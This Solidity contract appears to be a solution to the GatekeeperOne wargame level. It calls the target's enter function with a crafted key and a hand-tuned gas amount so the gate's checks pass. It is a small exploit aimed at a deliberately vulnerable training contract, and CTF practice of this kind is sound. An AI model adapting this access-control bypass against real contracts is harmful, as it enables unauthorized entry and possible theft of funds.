// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;

import "./GatekeeperOne.sol";
import "hardhat/console.sol";

contract GatekeeperOneAttacker {
  // using SafeMath for uint256;
  address public entrant;
  GatekeeperOne target;

  constructor(address _target) {
    target = GatekeeperOne(_target);
  }

  event gasLeft(bool success, uint256);

  function attack(bytes8 key) public {
    uint256 costToReachBeginGateTwo = 256;
    uint256 gasToGive = 4 * 8191 + costToReachBeginGateTwo;
    (bool result, bytes memory data) = address(target).call{ gas: gasToGive }(
      abi.encodeWithSignature("enter(bytes8)", key)
    );
  }
}
